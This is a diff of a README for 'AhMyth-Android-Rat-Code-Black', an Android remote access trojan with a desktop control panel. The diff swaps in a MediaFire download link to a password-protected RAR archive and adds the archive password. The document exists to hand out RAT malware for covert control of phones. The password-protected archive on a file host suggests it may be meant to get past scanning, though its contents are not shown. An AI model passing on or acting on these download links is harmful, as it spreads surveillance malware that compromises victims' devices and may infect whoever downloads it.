@@ -1,7 +1,8 @@
 # AhMyth-Android-Rat-Code-Black
 
-[Click Here to Download](https://rdmfile.eu/install/zJwkwc35sTQH)
+[Click Here to Download](https://www.mediafire.com/file/39eff69snfrip15/AhMyth.rar/file)
 
+[Pass : S0f4fr33!]
 
 It consists of two parts :
 * Server side : desktop application based on electron framework (control panel)
@@ -15,7 +16,7 @@ To install:
 
 1) From binaries
 Prerequisite :
-Download a binary from [Click Here To Download](https://rdmfile.eu/install/ejDYHm5VI2dh)
+Download a binary from [Click Here To Download](https://www.mediafire.com/file/39eff69snfrip15/AhMyth.rar/file)
 [Pass: S0f4fr33!]
 
 
